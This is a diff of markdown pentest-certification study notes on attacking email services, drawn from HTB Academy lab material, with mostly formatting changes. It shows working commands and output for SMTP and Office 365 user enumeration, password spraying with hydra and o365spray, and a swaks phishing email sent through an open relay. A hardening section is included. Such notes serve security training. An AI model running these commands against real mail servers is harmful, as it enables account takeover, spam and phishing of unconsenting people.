@@ -9,24 +9,27 @@ This document covers **exploitation techniques** against Email Services (SMTP/PO
 ## 🏗️ SMTP Attack Methodology
 
 ### Attack Chain Overview
+
 ```
 Service Discovery → User Enumeration → Mail Relay Testing → Credential Attacks → Social Engineering
 ```
 
 ### Key Attack Objectives
-- **User enumeration** via SMTP commands
-- **Mail relay abuse** for spam/phishing
-- **Credential harvesting** through SMTP authentication
-- **Information disclosure** via SMTP banners
-- **Social engineering** using email spoofing
 
----
+* **User enumeration** via SMTP commands
+* **Mail relay abuse** for spam/phishing
+* **Credential harvesting** through SMTP authentication
+* **Information disclosure** via SMTP banners
+* **Social engineering** using email spoofing
+
+***
 
 ## 📍 Service Discovery & Enumeration
 
 ### MX Record Enumeration
 
 #### HTB Academy MX Record Examples
+
 ```bash
 # Check MX records to identify mail servers
 host -t MX hackthebox.eu
@@ -50,6 +53,7 @@ host -t A mail1.inlanefreight.htb
 ```
 
 #### Cloud vs Custom Mail Servers
+
 ```
 Cloud Services:
 - aspmx.l.google.com (G-Suite)
@@ -63,6 +67,7 @@ Custom Mail Servers:
 ### Email Service Port Enumeration
 
 #### HTB Academy Complete Port List
+
 ```bash
 # All email-related ports
 sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
@@ -74,6 +79,7 @@ PORT   STATE SERVICE VERSION
 ```
 
 #### Email Service Ports Reference
+
 ```
 TCP/25    - SMTP Unencrypted
 TCP/143   - IMAP4 Unencrypted  
@@ -85,20 +91,22 @@ TCP/995   - POP3 Encrypted
 ```
 
 ### Key Information to Extract
-- **Mail server type** (Cloud vs Custom implementation)
-- **SMTP server software** (Postfix, Sendmail, Exchange)
-- **Version information** for vulnerability research
-- **Supported authentication methods**
-- **Mail relay configuration**
-- **Domain information** from banners
 
----
+* **Mail server type** (Cloud vs Custom implementation)
+* **SMTP server software** (Postfix, Sendmail, Exchange)
+* **Version information** for vulnerability research
+* **Supported authentication methods**
+* **Mail relay configuration**
+* **Domain information** from banners
+
+***
 
 ## 👥 User Enumeration Attacks
 
 ### SMTP User Enumeration Commands
 
 #### VRFY Command (HTB Academy Example)
+
 ```bash
 # HTB Academy VRFY enumeration
 telnet 10.10.110.20 25
@@ -119,6 +127,7 @@ VRFY new-user
 ```
 
 #### EXPN Command (HTB Academy Example)
+
 ```bash
 # HTB Academy EXPN enumeration
 telnet 10.10.110.20 25
@@ -137,6 +146,7 @@ EXPN support-team
 ```
 
 #### RCPT TO Command (HTB Academy Example)
+
 ```bash
 # HTB Academy RCPT TO enumeration
 telnet 10.10.110.20 25
@@ -160,6 +170,7 @@ RCPT TO:john
 ```
 
 #### POP3 User Enumeration (HTB Academy Example)
+
 ```bash
 # HTB Academy POP3 USER command enumeration
 telnet 10.10.110.20 110
@@ -179,6 +190,7 @@ USER john
 ### HTB Academy User Enumeration Example
 
 #### Using smtp-user-enum Tool (HTB Academy Example)
+
 ```bash
 # HTB Academy comprehensive enumeration example
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
@@ -209,6 +221,7 @@ Target domain ............ inlanefreight.htb
 ```
 
 #### Alternative Enumeration Methods
+
 ```bash
 # Using different SMTP commands
 smtp-user-enum -M VRFY -U users.list -t target_ip
@@ -221,13 +234,14 @@ echo -e "admin\nroot\nuser\ntest\nmail\npostmaster" > custom_users.txt
 nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} target_ip
 ```
 
----
+***
 
 ## ☁️ Cloud Enumeration (Office 365)
 
 ### O365spray Tool (HTB Academy Example)
 
 #### Validate Office 365 Domain
+
 ```bash
 # HTB Academy O365 validation example
 python3 o365spray.py --validate --domain msplaintext.xyz
@@ -249,6 +263,7 @@ python3 o365spray.py --validate --domain msplaintext.xyz
 ```
 
 #### Office 365 User Enumeration
+
 ```bash
 # HTB Academy O365 user enumeration
 python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
@@ -282,6 +297,7 @@ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
 ```
 
 ### Cloud Service Enumeration Tools
+
 ```bash
 # Microsoft Office 365
 python3 o365spray.py --enum -U users.txt --domain target.com
@@ -295,13 +311,14 @@ python3 o365spray.py --enum -U users.txt --domain target.com
 # - Adapt techniques based on cloud provider
 ```
 
----
+***
 
 ## 📨 Protocol Specific Attacks
 
 ### Open Mail Relay Exploitation
 
 #### Understanding Open Relay
+
 ```
 Open Relay = SMTP server allowing unauthenticated email relay
 Risk: Mail from any source transparently re-routed
@@ -310,6 +327,7 @@ Masking: Source appears to originate from open relay server
 ```
 
 #### HTB Academy Open Relay Detection
+
 ```bash
 # HTB Academy Nmap open relay detection
 nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
@@ -324,6 +342,7 @@ PORT   STATE SERVICE
 ```
 
 #### HTB Academy Open Relay Exploitation with Swaks
+
 ```bash
 # HTB Academy phishing email via open relay
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
@@ -362,6 +381,7 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 ```
 
 ### Manual Open Relay Testing
+
 ```bash
 # Manual telnet test for open mail relay
 telnet target_ip 25
@@ -382,6 +402,7 @@ QUIT
 ```
 
 ### Additional Relay Testing Tools
+
 ```bash
 # Using sendEmail tool
 sendEmail -f sender@external.com -t victim@external.com -s target_ip -m "Test message"
@@ -393,13 +414,14 @@ echo "Test message" | msmtp --host=target_ip --from=test@external.com victim@ext
 swaks --to test@external.com --from test@domain.com --server target_ip --auth-user admin --auth-password password
 ```
 
----
+***
 
 ## 🔐 Password Attacks
 
 ### Traditional Email Service Attacks
 
 #### HTB Academy Hydra Password Spray Example
+
 ```bash
 # HTB Academy POP3 password spraying
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
@@ -415,6 +437,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:
 ```
 
 #### Additional Hydra Examples
+
 ```bash
 # SMTP brute force
 hydra -l admin -P passwords.txt smtp://target_ip:25
@@ -429,6 +452,7 @@ hydra -L users.txt -P passwords.txt target_ip smtp
 ### Cloud Service Password Attacks
 
 #### HTB Academy O365 Password Spraying
+
 ```bash
 # HTB Academy O365 password spray example
 python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
@@ -466,6 +490,7 @@ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --locko
 ```
 
 ### Cloud-Specific Tools
+
 ```bash
 # Office 365
 o365spray --spray -U users.txt -p 'Password123!' --domain target.com
@@ -479,11 +504,12 @@ o365spray --spray -U users.txt -p 'Password123!' --domain target.com
 # - Keep tools updated due to frequent API changes
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Scenarios
 
 ### Scenario 1: SMTP User Enumeration
+
 ```bash
 # Task: Find available username for domain inlanefreight.htb
 # Target: 10.129.203.12
@@ -497,6 +523,7 @@ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
 ```
 
 ### Scenario 2: SMTP Relay Testing
+
 ```bash
 # Test for mail relay capabilities
 telnet target_ip 25
@@ -512,6 +539,7 @@ RCPT TO: victim@anotherdomain.com
 ```
 
 ### Scenario 3: Information Gathering
+
 ```bash
 # Extract domain information from SMTP
 telnet target_ip 25
@@ -524,67 +552,75 @@ EHLO test.com
 # - Domain names in responses
 ```
 
----
+***
 
 ## 📋 SMTP Attack Checklist
 
 ### Discovery & Enumeration
-- [ ] **Port scanning** - TCP/25, 465, 587 detection
-- [ ] **Banner grabbing** - Server version identification
-- [ ] **EHLO enumeration** - Supported extensions
-- [ ] **Authentication methods** - AUTH mechanisms
-- [ ] **Domain information** - Mail domain discovery
+
+* [ ] **Port scanning** - TCP/25, 465, 587 detection
+* [ ] **Banner grabbing** - Server version identification
+* [ ] **EHLO enumeration** - Supported extensions
+* [ ] **Authentication methods** - AUTH mechanisms
+* [ ] **Domain information** - Mail domain discovery
 
 ### User Enumeration
-- [ ] **VRFY command** - User verification
-- [ ] **EXPN command** - Mailing list expansion  
-- [ ] **RCPT TO** - Recipient checking
-- [ ] **smtp-user-enum** - Automated enumeration
-- [ ] **Nmap scripts** - smtp-enum-users
+
+* [ ] **VRFY command** - User verification
+* [ ] **EXPN command** - Mailing list expansion
+* [ ] **RCPT TO** - Recipient checking
+* [ ] **smtp-user-enum** - Automated enumeration
+* [ ] **Nmap scripts** - smtp-enum-users
 
 ### Exploitation
-- [ ] **Open relay testing** - Mail relay abuse
-- [ ] **Authentication attacks** - Credential brute forcing
-- [ ] **Email spoofing** - Sender impersonation
-- [ ] **Social engineering** - Phishing email crafting
-- [ ] **Data exfiltration** - Email-based data theft
+
+* [ ] **Open relay testing** - Mail relay abuse
+* [ ] **Authentication attacks** - Credential brute forcing
+* [ ] **Email spoofing** - Sender impersonation
+* [ ] **Social engineering** - Phishing email crafting
+* [ ] **Data exfiltration** - Email-based data theft
 
 ### Post-Exploitation
-- [ ] **Email harvesting** - Contact information gathering
-- [ ] **Persistence** - Email forwarding rules
-- [ ] **Lateral movement** - Internal email attacks
-- [ ] **Credential harvesting** - Phishing campaigns
 
----
+* [ ] **Email harvesting** - Contact information gathering
+* [ ] **Persistence** - Email forwarding rules
+* [ ] **Lateral movement** - Internal email attacks
+* [ ] **Credential harvesting** - Phishing campaigns
+
+***
 
 ## 🛡️ Defense & Mitigation
 
 ### SMTP Server Hardening
-- **Disable VRFY/EXPN** - Prevent user enumeration
-- **Configure relay restrictions** - Prevent open relay
-- **Implement authentication** - Require SMTP AUTH
-- **Rate limiting** - Prevent brute force attacks
-- **Banner customization** - Hide version information
+
+* **Disable VRFY/EXPN** - Prevent user enumeration
+* **Configure relay restrictions** - Prevent open relay
+* **Implement authentication** - Require SMTP AUTH
+* **Rate limiting** - Prevent brute force attacks
+* **Banner customization** - Hide version information
 
 ### Email Security
-- **SPF records** - Sender Policy Framework
-- **DKIM signatures** - DomainKeys Identified Mail
-- **DMARC policy** - Domain-based Message Authentication
-- **TLS encryption** - Secure mail transmission
-- **Content filtering** - Malware and spam protection
+
+* **SPF records** - Sender Policy Framework
+* **DKIM signatures** - DomainKeys Identified Mail
+* **DMARC policy** - Domain-based Message Authentication
+* **TLS encryption** - Secure mail transmission
+* **Content filtering** - Malware and spam protection
 
 ### Monitoring & Detection
-- **Failed authentication logs** - Brute force detection
-- **Unusual mail patterns** - Anomaly detection
-- **User enumeration attempts** - VRFY/EXPN monitoring
-- **Relay abuse detection** - External recipient tracking
-- **Rate limiting alerts** - High-volume email detection
 
----
+* **Failed authentication logs** - Brute force detection
+* **Unusual mail patterns** - Anomaly detection
+* **User enumeration attempts** - VRFY/EXPN monitoring
+* **Relay abuse detection** - External recipient tracking
+* **Rate limiting alerts** - High-volume email detection
+
+***
 
 ## 🚀 HTB Academy Lab Scenarios
 
 ### Lab Exercise 1: SMTP User Enumeration
+
 ```bash
 Target: inlanefreight.htb mail server  
 Task: Find available username for domain inlanefreight.htb
@@ -618,6 +654,7 @@ Target domain ............ inlanefreight.htb
 ```
 
 ### Lab Exercise 2: Email Access & Flag Extraction
+
 ```bash
 Target: marlin@inlanefreight.htb email account
 Task: Access email and submit flag content
@@ -682,6 +719,7 @@ flag: HTB{...}
 ```
 
 ### Key Lab Learning Points
+
 ```
 1. SMTP User Enumeration (Lab 1)
    - smtp-user-enum with RCPT method
@@ -708,11 +746,12 @@ flag: HTB{...}
    - Flag extraction: HTB{...}
 ```
 
----
+***
 
 ## 🔧 Tools & Resources
 
 ### Essential Email Service Tools
+
 ```bash
 # User enumeration
 smtp-user-enum          # VRFY/EXPN/RCPT enumeration
@@ -736,6 +775,7 @@ ncrack                 # Network authentication cracker
 ```
 
 ### Useful Nmap SMTP Scripts
+
 ```bash
 smtp-commands          # Available SMTP commands
 smtp-enum-users        # User enumeration  
@@ -747,26 +787,26 @@ smtp-vuln-cve2011-1720  # Postfix vulnerability
 smtp-vuln-cve2011-1764  # Exim vulnerability
 ```
 
----
+***
 
 ## 🔗 Related Techniques
 
-- **[Email Reconnaissance](../services/smtp-enumeration.md)** - Information gathering
-- **[Social Engineering](../social-engineering/)** - Email-based attacks
-- **[Phishing](../social-engineering/phishing.md)** - Malicious email campaigns
-- **[Domain Attacks](dns-attacks.md)** - DNS-based email attacks
-- **[Password Attacks](../passwords-attacks/)** - SMTP credential attacks
+* [**Email Reconnaissance**](../services/smtp-enumeration.md) - Information gathering
+* [**Social Engineering**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/social-engineering/README.md) - Email-based attacks
+* [**Phishing**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/social-engineering/phishing.md) - Malicious email campaigns
+* [**Domain Attacks**](dns-attacks.md) - DNS-based email attacks
+* [**Password Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/passwords-attacks/README.md) - SMTP credential attacks
 
----
+***
 
 ## 📚 References
 
-- **HTB Academy** - Attacking Common Services Module
-- **RFC 5321** - Simple Mail Transfer Protocol
-- **smtp-user-enum** - SMTP user enumeration tool
-- **OWASP Email Security** - Email attack vectors
-- **Postfix Documentation** - SMTP server configuration
+* **HTB Academy** - Attacking Common Services Module
+* **RFC 5321** - Simple Mail Transfer Protocol
+* **smtp-user-enum** - SMTP user enumeration tool
+* **OWASP Email Security** - Email attack vectors
+* **Postfix Documentation** - SMTP server configuration
 
----
+***
 
-*This document provides comprehensive SMTP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 
+_This document provides comprehensive SMTP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment._
